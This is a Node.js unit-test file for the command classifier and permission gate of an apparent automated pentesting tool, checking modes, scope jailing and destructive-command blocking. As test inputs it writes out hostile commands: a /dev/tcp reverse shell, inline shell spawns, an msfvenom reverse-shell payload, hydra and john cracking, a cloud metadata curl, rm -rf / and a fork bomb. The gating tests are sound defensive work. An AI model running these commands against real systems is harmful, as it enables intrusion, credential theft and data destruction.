// command-tokens-gate.test.js — dir_1782239552993
//
// Unit tests for the command_tokens permission gate (soc-command-classifier.js).
//
// Covers:
//  Part 1: scripting-language contextual classification fix — python/python3/perl/ruby/node
//          running exploit SCRIPT FILES are now exploit_test (not exploit_rce), so they
//          can run in exploitation_auto mode without requiring full_engagement.
//          Inline exec (-c/-e) remains exploit_rce.
//  Part 2: scope gate (workspace_jail) still blocks out-of-scope targets regardless
//          of which tool is being used — the scope wall is untouched by this change.
//  Part 3: pre-existing exploit_test tools (msfconsole, searchsploit, hydra, etc.)
//          still allowed in exploitation_auto — regression guard.
//
// No DB, no bridge process required. Tests pure logic.
// Run with: node tests/command-tokens-gate.test.js

"use strict";

const assert = require("assert");
const path   = require("path");

// Load from the bridge directory (this test file lives in tests/ sub-dir)
const classifier = require(path.join(__dirname, "..", "soc-command-classifier"));
const enforcer   = require(path.join(__dirname, "..", "permission-enforcer"));

let passed = 0;
let failed = 0;
function check(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passed++;
  } catch (e) {
    console.error(`  ✗ ${name}: ${e.message}`);
    failed++;
  }
}

// ── Helper: build engagement fixture ─────────────────────────────────────────
function eng(mode, targets) {
  return {
    permission_mode: mode,
    scope: JSON.stringify({ targets: targets || ["192.168.1.0/24"] }),
  };
}

// ── Part 1: scripting-language contextual fix ─────────────────────────────────
console.log("\n[1] Scripting-language contextual classification (dir_1782239552993)");
{
  // 1a: direct classify — script file invocations
  check("python exploit.py classifies as exploit_test", () => {
    const r = classifier.classifyCommand("python /usr/share/exploitdb/exploits/hardware/remote/39920.py 192.168.1.24 8000");
    assert.strictEqual(r.intent, "exploit_test");
    assert.ok(r.matched_rule.includes("script_file"), `expected script_file in matched_rule, got: ${r.matched_rule}`);
  });

  check("python3 exploit.py classifies as exploit_test", () => {
    const r = classifier.classifyCommand("python3 /tmp/exploit_hikvision.py 192.168.1.24");
    assert.strictEqual(r.intent, "exploit_test");
  });

  check("python3 local_script.py classifies as exploit_test", () => {
    const r = classifier.classifyCommand("python3 exploit.py 192.168.1.19 8080");
    assert.strictEqual(r.intent, "exploit_test");
  });

  check("perl .pl script classifies as exploit_test", () => {
    const r = classifier.classifyCommand("perl /usr/share/exploitdb/exploits/linux/remote/12345.pl 192.168.1.1");
    assert.strictEqual(r.intent, "exploit_test");
  });

  check("ruby .rb script classifies as exploit_test", () => {
    const r = classifier.classifyCommand("ruby /usr/share/metasploit-framework/tools/exploit.rb 192.168.1.1");
    assert.strictEqual(r.intent, "exploit_test");
  });

  check("node .js script classifies as exploit_test", () => {
    const r = classifier.classifyCommand("node /usr/share/exploitdb/exploits/webapps/cve.js 192.168.1.1");
    assert.strictEqual(r.intent, "exploit_test");
  });

  // 1b: inline exec flags → exploit_rce
  check("python3 -c '...' classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("python3 -c \"import os; os.system('/bin/sh')\"");
    assert.strictEqual(r.intent, "exploit_rce");
    assert.ok(r.matched_rule.includes("inline_exec"), `expected inline_exec in matched_rule, got: ${r.matched_rule}`);
  });

  check("python -c '...' classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("python -c \"exec(compile(open('shell.py').read(), 'shell.py', 'exec'))\"");
    assert.strictEqual(r.intent, "exploit_rce");
  });

  check("perl -e '...' classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("perl -e 'use Socket; ...'");
    assert.strictEqual(r.intent, "exploit_rce");
  });

  check("ruby -e '...' classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("ruby -e \"exec '/bin/sh'\"");
    assert.strictEqual(r.intent, "exploit_rce");
  });

  check("node -e '...' classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("node -e \"require('child_process').exec('/bin/sh')\"");
    assert.strictEqual(r.intent, "exploit_rce");
  });

  // 1c: python -m module → enumeration
  check("python3 -m http.server classifies as enumeration", () => {
    const r = classifier.classifyCommand("python3 -m http.server 8080");
    assert.strictEqual(r.intent, "enumeration");
    assert.ok(r.matched_rule.includes("module_run"), `expected module_run in matched_rule, got: ${r.matched_rule}`);
  });

  // 1d: bash/sh still exploit_rce (unchanged from before this fix)
  check("bash /script.sh still classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("bash /tmp/rev_shell.sh 192.168.1.1");
    assert.strictEqual(r.intent, "exploit_rce");
  });

  check("sh -c '...' still classifies as exploit_rce", () => {
    const r = classifier.classifyCommand("sh -c '/bin/bash -i >& /dev/tcp/10.9.0.1/4444 0>&1'");
    assert.strictEqual(r.intent, "exploit_rce");
  });
}

// ── Part 2: THE REGRESSION — qi 2124 must now be allowed in exploitation_auto ─
console.log("\n[2] Regression test — qi 2124 unblocked");
{
  check("qi2124: python exploit.py target in exploitation_auto mode PASSES gate", () => {
    const cmd = "python /usr/share/exploitdb/exploits/hardware/remote/39920.py 192.168.1.24 8000";
    const e   = eng("exploitation_auto");
    const v   = enforcer.enforceCommandTokens(e, cmd);
    assert.strictEqual(v.allowed, true, `Expected allowed=true, got: ${JSON.stringify(v)}`);
    assert.strictEqual(v.command_intent, "exploit_test");
  });

  check("qi2124: python exploit.py against out-of-scope IP still blocked by workspace_jail", () => {
    const cmd = "python /usr/share/exploitdb/exploits/hardware/remote/39920.py 8.8.8.8 8000";
    const e   = eng("exploitation_auto");  // scope: 192.168.1.0/24
    const v   = enforcer.enforceAll(e, "exploit_probe", cmd);
    assert.strictEqual(v.allowed, false, "Expected denied for out-of-scope target");
    assert.strictEqual(v.layer, "workspace_jail", `Expected workspace_jail layer, got: ${v.layer}`);
  });
}

// ── Part 3: mode boundary — script files vs inline exec ──────────────────────
console.log("\n[3] Mode boundary: exploitation_auto can run scripts, needs full_engagement for inline exec");
{
  check("python3 script file: exploitation_auto → ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "python3 exploit.py 192.168.1.10");
    assert.strictEqual(v.allowed, true);
  });

  check("python3 -c inline: exploitation_auto → DENIED (needs full_engagement)", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "python3 -c \"import pty; pty.spawn('/bin/sh')\"");
    assert.strictEqual(v.allowed, false);
    assert.ok(v.required_mode === "full_engagement", `Expected required_mode=full_engagement, got: ${v.required_mode}`);
  });

  check("python3 -c inline: full_engagement → ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("full_engagement"), "python3 -c \"import pty; pty.spawn('/bin/sh')\"");
    assert.strictEqual(v.allowed, true);
  });

  check("perl -e inline: exploitation_auto → DENIED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "perl -e 'use Socket; ...'");
    assert.strictEqual(v.allowed, false);
  });

  check("perl script file: exploitation_auto → ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "perl /usr/share/exploitdb/exploits/linux/remote/12345.pl 192.168.1.1");
    assert.strictEqual(v.allowed, true);
  });

  check("ruby -e inline: exploitation_auto → DENIED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "ruby -e \"exec '/bin/sh'\"");
    assert.strictEqual(v.allowed, false);
  });

  check("ruby script file: exploitation_auto → ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "ruby exploit.rb 192.168.1.1");
    assert.strictEqual(v.allowed, true);
  });
}

// ── Part 4: scope gate untouched — out-of-scope always blocked ───────────────
console.log("\n[4] Scope gate: out-of-scope targets still blocked regardless of tool");
{
  check("python exploit.py against 8.8.8.8 blocked (not in 192.168.1.0/24)", () => {
    const cmd = "python3 /tmp/exploit.py 8.8.8.8";
    const v = enforcer.enforceAll(eng("full_engagement"), "exploit_probe", cmd);
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.layer, "workspace_jail");
  });

  check("msfconsole against 8.8.8.8 blocked (not in 192.168.1.0/24)", () => {
    const cmd = "msfconsole -q -x \"use auxiliary/scanner/ssh/ssh_login; set RHOSTS 8.8.8.8; run; exit\"";
    const v = enforcer.enforceAll(eng("full_engagement"), "exploit_probe", cmd);
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.layer, "workspace_jail");
  });

  check("GCP metadata IP 169.254.169.254 blocked even in full_engagement mode", () => {
    const cmd = "curl http://169.254.169.254/latest/meta-data/";
    const v = enforcer.enforceAll(eng("full_engagement"), "recon", cmd);
    // 169.254.169.254 is not in 192.168.1.0/24, so workspace_jail should block it
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.layer, "workspace_jail");
  });

  check("*.internal hostname blocked even in full_engagement mode", () => {
    const cmd = "curl http://metadata.internal/";
    const v = enforcer.enforceAll(eng("full_engagement"), "recon", cmd);
    // metadata.internal is not in scope targets, workspace_jail blocks it
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.layer, "workspace_jail");
  });

  check("in-scope target 192.168.1.19 passes scope gate in full_engagement", () => {
    const cmd = "python3 exploit.py 192.168.1.19 8000";
    const v = enforcer.enforceAll(eng("full_engagement"), "exploit_probe", cmd);
    assert.strictEqual(v.allowed, true);
  });
}

// ── Part 5: pre-existing exploit_test tools regression guard ─────────────────
console.log("\n[5] Existing exploit_test tools still work in exploitation_auto");
{
  check("msfconsole in exploitation_auto: ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "msfconsole -q -x \"use exploit/...; run; exit\"");
    assert.strictEqual(v.allowed, true);
    assert.strictEqual(v.command_intent, "exploit_test");
  });

  check("searchsploit in exploitation_auto: ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "searchsploit hikvision rtsp");
    assert.strictEqual(v.allowed, true);
    assert.strictEqual(v.command_intent, "exploit_test");
  });

  check("hydra ssh brute in exploitation_auto: ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10");
    assert.strictEqual(v.allowed, true);
  });

  check("john hash cracking in exploitation_auto: ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt");
    assert.strictEqual(v.allowed, true);
  });

  check("sqlmap in exploitation_auto: ALLOWED", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "sqlmap -u http://192.168.1.19/cgi-bin/query.cgi?id=1 --dbs");
    assert.strictEqual(v.allowed, true);
  });

  check("msfvenom payload generation in exploitation_auto: ALLOWED (generates locally, no target)", () => {
    const v = enforcer.enforceCommandTokens(eng("exploitation_auto"), "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.0.1 LPORT=4444 -f elf -o /tmp/shell");
    assert.strictEqual(v.allowed, true);
  });
}

// ── Part 6: destructive patterns still blocked everywhere ────────────────────
console.log("\n[6] Always-destructive patterns still blocked regardless of mode");
{
  check("rm -rf / still blocked in full_engagement", () => {
    const v = enforcer.enforceCommandTokens(eng("full_engagement"), "rm -rf /");
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.command_intent, "destructive");
  });

  check("fork bomb still blocked in full_engagement", () => {
    const v = enforcer.enforceCommandTokens(eng("full_engagement"), ":(){:|:&};:");
    assert.strictEqual(v.allowed, false);
    assert.strictEqual(v.command_intent, "destructive");
  });
}

// ── Summary ───────────────────────────────────────────────────────────────────
console.log(`\nResults: ${passed} passed, ${failed} failed`);
if (failed > 0) process.exit(1);
